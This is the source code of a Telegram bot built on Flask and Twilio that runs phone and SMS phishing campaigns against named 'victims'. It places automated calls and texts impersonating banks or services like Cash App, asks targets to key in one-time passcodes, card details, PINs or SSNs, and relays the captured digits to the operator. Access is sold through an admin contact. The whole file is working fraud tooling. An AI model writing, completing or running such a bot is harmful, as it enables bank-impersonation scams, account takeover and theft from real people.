import flask
from datetime import *
from flask import Flask, session
import requests
import time
import phonenumbers
import telebot
import twilio
from phonenumbers import NumberParseException
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.twiml.messaging_response import MessagingResponse
from flask import Flask, request
from telebot import types
from twilio.rest import Client
import sqlite3
import threading
from dbase import *
from cred import *

# Thread-local storage for SQLite connections
thread_local = threading.local()

def get_db_connection():
    """Get thread-safe database connection"""
    if not hasattr(thread_local, 'conn'):
        thread_local.conn = sqlite3.connect('UserDetails.db', check_same_thread=False, timeout=10)
        thread_local.conn.row_factory = sqlite3.Row
    return thread_local.conn

# Twilio connection
client = Client(account_sid, auth_token)

# Flask connection
app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this to a secure key

# Bot connection
bot = telebot.TeleBot(API_TOKEN, threaded=False)
bot.remove_webhook()
bot.set_webhook(url=callurl)

# Initialize database
def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    # Add your table creation queries here if needed
    conn.commit()

# Call init_db on startup
init_db()

# Process webhook calls
@app.route('/', methods=['GET', 'POST'])
def webhook():
    if flask.request.headers.get('content-type') == 'application/json':
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        try:
            bot.process_new_updates([update])
            return ''
        except Exception as e:
            print(f"Error processing webhook: {e}")
            return 'Error', 500
    else:
        print("Invalid content-type")
        flask.abort(403)

# Handle '/start'
@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        id = message.from_user.id
        print(f"User {id} started")
        
        if check_admin(id) == True:
            if check_user(id) != True:
                create_user_lifetime_db(id)
            
            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            keyboard.row_width = 2
            item1 = types.KeyboardButton(text="User Mode")
            item2 = types.KeyboardButton(text="Admin Mode")
            keyboard.add(item1, item2)
            send = bot.send_message(message.chat.id, "Welcome! 🥳\n\nWould you like to be in user or admin mode?",
                                    reply_markup=keyboard)
        elif (check_user(id) == True) and check_expiry_days(id) > 0:
            days_left = check_expiry_days(id)
            name = message.from_user.first_name
            send = bot.send_message(message.chat.id, f"Hey {name} .\nYou have {days_left} days left ")
            send = bot.send_message(message.chat.id, "Reply With Victim's Phone Number 📱:\n\ne.g +14358762364\n\nMake sure to use the + or the bot will not work correctly!")
            bot.register_next_step_handler(send, saving_phonenumber)
        else:
            send = bot.send_message(message.chat.id,
                                    "Access Not Authorized ❌ For Buy access \n\nContact Admin @Wolphite")
    except Exception as e:
        print(f"Error in send_welcome: {e}")
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

def saving_phonenumber(message):
    try:
        userid = message.from_user.id
        no_tobesaved = str(message.text).strip()
        
        # Basic phone number validation
        if not no_tobesaved.startswith('+'):
            bot.send_message(message.chat.id, "❌ Invalid format. Phone number must start with +")
            bot.send_message(message.chat.id, "Use /start command to try again")
            return
            
        z = phonenumbers.parse(no_tobesaved, "US")
        
        if phonenumbers.is_valid_number(z):
            save_phonenumber(no_tobesaved, userid)
            send = bot.send_message(message.chat.id, "✅ Success! Number confirmed.\n\n*Type 'Ok' to continue*", parse_mode='Markdown')
            bot.register_next_step_handler(send, call_or_sms_or_script)
        else:
            bot.send_message(message.chat.id,
                             "❌ Invalid Number\nUS numbers ONLY.\nUse /start command.")
    except NumberParseException:
        bot.send_message(message.chat.id, "❌ Invalid Number\nUse /start command")
    except Exception as e:
        print(f"Error in saving_phonenumber: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def call_or_sms_or_script(message):
    try:
        userid = message.from_user.id
        name = message.from_user.first_name
        
        # Validate message content
        if message.text.lower() != 'ok':
            bot.send_message(message.chat.id, "Please type 'Ok' to continue")
            bot.register_next_step_handler(message, call_or_sms_or_script)
            return
            
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="📞 Call Mode")
        item3 = types.KeyboardButton(text="✉ SMS Mode")
        item4 = types.KeyboardButton(text="✒ Custom Script")
        keyboard.add(item1, item3, item4)
        bot.send_message(message.chat.id, f"What mode do you want, {name} 👑", reply_markup=keyboard)
    except Exception as e:
        print(f"Error in call_or_sms_or_script: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

# Updated handlers with consistent naming
@bot.message_handler(content_types=["text"], func=lambda message: message.text == "📞 Call Mode")
def call_mode(message):
    send = bot.send_message(message.chat.id, "Welcome to Call Mode 📞\n\n*Type 'Ok' to continue*", parse_mode='Markdown')
    bot.register_next_step_handler(send, card_or_Otp)

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "✉ SMS Mode")
def sms_mode(message):
    send = bot.send_message(message.chat.id,"Ok, \n\n*Reply with a service name 🏦*\n\n(e.g. Cash App):", parse_mode='Markdown')
    bot.register_next_step_handler(send, sms_mode2)

def sms_mode2(message):
    try:
        bankname = message.text
        userid = message.from_user.id
        
        if not bankname or len(bankname.strip()) < 2:
            bot.send_message(message.chat.id, "❌ Invalid service name. Please try again.")
            return
            
        save_bankName(bankname.strip(), userid)
        send = bot.send_message(message.chat.id, "✅ Success! Say 'text' to send message now")
        bot.register_next_step_handler(send, send_text)
    except Exception as e:
        print(f"Error in sms_mode2: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def send_text(message):
    try:
        userid = str(message.from_user.id)
        chat_id = message.chat.id
        
        if message.text.lower() != 'text':
            bot.send_message(chat_id, "Please say 'text' to send SMS")
            bot.register_next_step_handler(message, send_text)
            return
            
        ph_no = fetch_phonenumber(userid)
        bankname = fetch_bankname(userid)
        
        if not ph_no:
            bot.send_message(chat_id, "❌ Phone number not found. Use /start to begin again.")
            return
            
        print(f"Sending SMS to {ph_no}")
        
        sms_message = client.messages.create(
            body=f'This is an automated message from {bankname}.\n\nThere has been a suspicious attempt to login to your account, and we need to verify your identity by confirming the phone number on file.\n\nTo block this attempt please reply with the One Time Passcode you just received. \n\nMsg&Data rates may apply.',
            from_=twiliosmsnumber,
            status_callback= callurl+'/statuscallback2/'+userid,
            to=ph_no)
            
        print('Message sent successfully!')
        bot.send_message(chat_id, "📨 Text is being sent...")
        
    except Exception as e:
        print(f"Error in send_text: {e}")
        bot.send_message(chat_id, "❌ An error has occurred, contact admin @Wolphite")

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "✒ Custom Script")
def custom_script(message):
    try:
        send = bot.send_message(message.chat.id,
                                'When writing script, ensure you end script with a press one followed by pound key line\ne.g "Press 1 followed by pound key to secure account" ')
        send1 = bot.send_message(message.chat.id, "*Sample Script*", parse_mode='Markdown')
        send2 = bot.send_message(message.chat.id,
                                 "Hello this is an automated call from Smiths Bank, we have detected an unauthorized access request to your account, Press 1 followed by pound key to secure account")
        send3 = bot.send_message(message.chat.id,
                                 "*Use commas where fullstops should be and use commas where commas should be also*",
                                 parse_mode='Markdown')
        send3 = bot.send_message(message.chat.id, "Please enter script: ")
        bot.register_next_step_handler(send3, savings_script)
    except Exception as e:
        print(f"Error in custom_script: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def savings_script(message):
    try:
        script_tobesaved = message.text
        userid = message.from_user.id
        
        if not script_tobesaved or len(script_tobesaved.strip()) < 10:
            bot.send_message(message.chat.id, "❌ Script too short. Please enter a valid script.")
            return
            
        save_script(script_tobesaved.strip(), userid)
        send = bot.send_message(message.chat.id, "✅ Your script has been saved for one time use.\n\nReply with 'ok' ")
        bot.register_next_step_handler(send, enter_options)
    except Exception as e:
        print(f"Error in savings_script: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def enter_options(message):
    try:
        if message.text.lower() != 'ok':
            bot.send_message(message.chat.id, "Please type 'ok' to continue")
            bot.register_next_step_handler(message, enter_options)
            return
            
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="1")
        item2 = types.KeyboardButton(text="2")
        keyboard.add(item1, item2)
        send = bot.reply_to(message, " Enter number of input options for victim: ",
                            reply_markup=keyboard)
        bot.register_next_step_handler(send, saving_options0)
    except Exception as e:
        print(f"Error in enter_options: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def saving_options0(message):
    try:
        userid = message.from_user.id
        option_number = message.text
        
        if option_number not in ["1", "2"]:
            bot.send_message(message.chat.id, "❌ Invalid option. Please select 1 or 2.")
            return
            
        save_option_number(option_number, userid)
        
        if option_number == "1":
            send0 = bot.send_message(message.chat.id,
                                    'Be sure to end text with \n"followed by pound key" \n\n(e.g "Please enter your 9 digit SSN followed by pound key" )')
            send = bot.send_message(message.chat.id,"Please enter input option:")
            bot.register_next_step_handler(send, saving_options1)

        elif option_number == "2":
            send = bot.send_message(message.chat.id,
                                    'Be sure to end text with \n"followed by pound key" \n\n(e.g "Please enter your 9 digit SSN followed by pound key" )')
            send = bot.send_message(message.chat.id,"Please enter your first input option:")
            bot.register_next_step_handler(send, saving_options2)
    except Exception as e:
        print(f"Error in saving_options0: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def saving_options1(message):
    try:
        userid = message.from_user.id
        option1 = message.text
        
        if not option1 or len(option1.strip()) < 5:
            bot.send_message(message.chat.id, "❌ Invalid input option. Please enter valid text.")
            return
            
        save_option1(option1.strip(), userid)
        send = bot.send_message(message.chat.id, "✅ Success! Say 'call' to call now")
        bot.register_next_step_handler(send, making_call_custom)
    except Exception as e:
        print(f"Error in saving_options1: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def saving_options2(message):
    try:
        userid = message.from_user.id
        option1 = message.text
        
        if not option1 or len(option1.strip()) < 5:
            bot.send_message(message.chat.id, "❌ Invalid input option. Please enter valid text.")
            return
            
        save_option1(option1.strip(), userid)
        send = bot.send_message(message.chat.id, "✅ Please enter your second input option: ")
        bot.register_next_step_handler(send, saving_options3)
    except Exception as e:
        print(f"Error in saving_options2: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def saving_options3(message):
    try:
        userid = message.from_user.id
        option2 = message.text
        
        if not option2 or len(option2.strip()) < 5:
            bot.send_message(message.chat.id, "❌ Invalid input option. Please enter valid text.")
            return
            
        save_option2(option2.strip(), userid)
        send = bot.send_message(message.chat.id, '✅ Success! Say "call" to call now')
        bot.register_next_step_handler(send, making_call_custom)
    except Exception as e:
        print(f"Error in saving_options3: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def making_call_custom(message):
    try:
        if message.text.lower() != 'call':
            bot.send_message(message.chat.id, "Please say 'call' to make a call")
            bot.register_next_step_handler(message, making_call_custom)
            return
            
        userid = str(message.from_user.id)
        chat_id = message.chat.id
        ph_no = fetch_phonenumber(userid)
        
        if not ph_no:
            bot.send_message(chat_id, "❌ Phone number not found. Use /start to begin again.")
            return
            
        print(f"Making custom call to {ph_no}")
        
        call = client.calls.create(
            record=True,
            status_callback=(callurl + '/statuscallback/'+userid),
            recording_status_callback=(callurl + '/details_rec/'+userid),
            status_callback_event=['ringing', 'answered', 'completed'],
            url=(callurl + '/custom/'+userid),
            to=ph_no,
            from_=twilionumber,
            machine_detection='Enable'
        )
        
        print(f"Call SID: {call.sid}")
        bot.send_message(chat_id, "📞 Calling...")
        
    except Exception as e:
        print(f"Error in making_call_custom: {e}")
        bot.send_message(message.chat.id, "❌ Sorry I am currently unable to make calls\n\nContact Admin")

def card_or_Otp(message):
    try:
        if message.text.lower() != 'ok':
            bot.send_message(message.chat.id, "Please type 'Ok' to continue")
            bot.register_next_step_handler(message, card_or_Otp)
            return
            
        userid = message.from_user.id
        name = message.from_user.first_name
        
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="💳 Card Details")
        item2 = types.KeyboardButton(text="🏦 Bank Account")
        item3 = types.KeyboardButton(text="📌 PIN Code")
        item4 = types.KeyboardButton(text="🤖 Bypass OTP")
        item5 = types.KeyboardButton(text="🍎 Apple Pay")
        item6 = types.KeyboardButton(text="👤 SSN")
        item7 = types.KeyboardButton(text="🚘 Driver's License")
        
        keyboard.add(item1, item2)
        keyboard.add(item3, item4)
        keyboard.add(item5, item6)
        keyboard.add(item7)
        
        bot.send_message(message.chat.id, f"Please choose an option, {name}. 👑", reply_markup=keyboard)
    except Exception as e:
        print(f"Error in card_or_Otp: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

# Other handler functions remain similar but add try-except blocks
# I'll show a few examples and you should apply to all:

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "💳 Card Details")
def grab_card_details(message):
    try:
        userid = message.from_user.id
        send = bot.send_message(message.chat.id,
                                "Ok, \n\n*Reply with a service name 🏦*\n\n(e.g. Cash App):", parse_mode='Markdown')
        bot.register_next_step_handler(send, save_service_card)
    except Exception as e:
        print(f"Error in grab_card_details: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def save_service_card(message):
    try:
        userid = message.from_user.id
        name_tobesaved = str(message.text).strip()
        
        if not name_tobesaved or len(name_tobesaved) < 2:
            bot.send_message(message.chat.id, "❌ Invalid service name. Please try again.")
            return
            
        save_bankName(name_tobesaved, userid)
        send = bot.send_message(message.chat.id, '✅ Success! Reply "Call" to begin the call.')
        bot.register_next_step_handler(send, make_call_card)
    except Exception as e:
        print(f"Error in save_service_card: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def make_call_card(message):
    try:
        if message.text.lower() != 'call':
            bot.send_message(message.chat.id, "Please reply with 'Call' to make a call")
            bot.register_next_step_handler(message, make_call_card)
            return
            
        userid = str(message.from_user.id)
        chat_id = message.chat.id
        phonenumber = fetch_phonenumber(userid)
        
        if not phonenumber:
            bot.send_message(chat_id, "❌ Phone number not found. Use /start to begin again.")
            return
            
        print(f"Making card call to {phonenumber}")
        
        call = client.calls.create(
            record=True,
            status_callback=(callurl +'/statuscallback/'+userid),
            recording_status_callback=(callurl + '/details_rec/'+userid),
            status_callback_event=['ringing', 'answered', 'completed'],
            url=(callurl + '/crdf/'+userid),
            to=phonenumber,
            from_=twilionumber,
            machine_detection='Enable'
        )
        
        print(f"Call SID: {call.sid}")
        bot.send_message(chat_id, "📞 Calling...")
        
    except Exception as e:
        print(f"Error in make_call_card: {e}")
        bot.send_message(message.chat.id, "❌ An error occurred. Contact Admin")

# Admin functions with proper error handling
@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Admin Mode")
def admin_mode(message):
    try:
        send1 = bot.send_message(message.chat.id, "Hey Admin 👑\n*Type 'Ok' to continue*", parse_mode='Markdown')
        bot.register_next_step_handler(send1, adminfunction)
    except Exception as e:
        print(f"Error in admin_mode: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

def adminfunction(message):
    try:
        if message.text.lower() != 'ok':
            bot.send_message(message.chat.id, "Please type 'Ok' to continue")
            bot.register_next_step_handler(message, adminfunction)
            return
            
        userid = message.from_user.id
        name = message.from_user.first_name
        
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
        keyboard.row_width = 1
        item = types.KeyboardButton(text="Edit access")
        keyboard.add(item)
        
        bot.send_message(message.chat.id, f"Please choose an option, {name}. 👑", reply_markup=keyboard)
    except Exception as e:
        print(f"Error in adminfunction: {e}")
        bot.send_message(message.chat.id, "An error occurred. Use /start to try again.")

# Add this function to dbase.py to avoid naming conflict
def create_user_lifetime_db(userid):
    """Create lifetime user in database"""
    conn = get_db_connection()
    c = conn.cursor()
    try:
        expiry_date = datetime.now() + timedelta(days=36500)  # ~100 years
        c.execute("INSERT OR REPLACE INTO users (userid, expiry_date) VALUES (?, ?)", 
                  (userid, expiry_date))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error creating lifetime user: {e}")
        return False
    finally:
        pass  # Don't close connection, it's thread-local

# Update the user creation functions to use proper naming
def create_lifetime_user_handler(message):
    try:
        userid = message.text.strip()
        
        if not userid.isdigit():
            bot.send_message(message.chat.id, "❌ Invalid UserID. Must be numeric.")
            return
            
        if create_user_lifetime_db(userid):
            bot.send_message(message.chat.id, f"✅ Added user {userid} for Life\n\nUse /start for other functionality")
        else:
            bot.send_message(message.chat.id, "❌ Failed to add user")
    except Exception as e:
        print(f"Error in create_lifetime_user_handler: {e}")
        bot.send_message(message.chat.id, "❌ An error occurred")

# Fix for OTP endpoint
@app.route("/wf/<userid>", methods=['GET', 'POST'])
def voice_wf(userid):
    try:
        print(f"WF endpoint called for user: {userid}")
        bankname = fetch_bankname(userid)
        resp = VoiceResponse()
        choice = request.values.get('AnsweredBy', '')
        
        if choice in ['human', 'unknown']:
            gather = Gather(action='/gatherOTP/'+userid, finishOnKey='*', input="dtmf")
            gather.say(f"This is an automated call from {bankname}, We have detected a suspicious attempt to login to your account, if this was you, end the call, To block this attempt, please enter the one time passcode sent to your phone number followed by the star key, ")
            resp.append(gather)
            resp.redirect('/wf/'+userid)
            return str(resp)
        else:
            resp.hangup()
            bot.send_message(userid, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
            return str(resp)
    except Exception as e:
        print(f"Error in voice_wf: {e}")
        return str(VoiceResponse().hangup())

@app.route('/gatherOTP/<userid>', methods=['GET', 'POST'])
def gatherotp(userid):
    try:
        chat_id = userid
        resp = VoiceResponse()
        
        if 'Digits' in request.values:
            choice = request.values['Digits']
            print(f"OTP collected: {choice}")
            save_otpcode(choice, userid)
            resp.say("Thank you, this attempt has been blocked! Goodbye.")
            bot.send_message(chat_id, f"The collected OTP is {choice}")
        else:
            save_otpcode('0', userid)
            resp.say("No code entered. Goodbye.")
            bot.send_message(chat_id, "No OTP was collected")
            
        return str(resp)
    except Exception as e:
        print(f"Error in gatherotp: {e}")
        return str(VoiceResponse().hangup())

# Add cleanup function for database connections
@app.teardown_appcontext
def close_db_connection(exception):
    """Close database connection at app teardown"""
    if hasattr(thread_local, 'conn'):
        thread_local.conn.close()
        del thread_local.conn

if __name__ == '__main__':
    # Don't use debug=True in production
    app.run(host='0.0.0.0', port=5000, debug=False)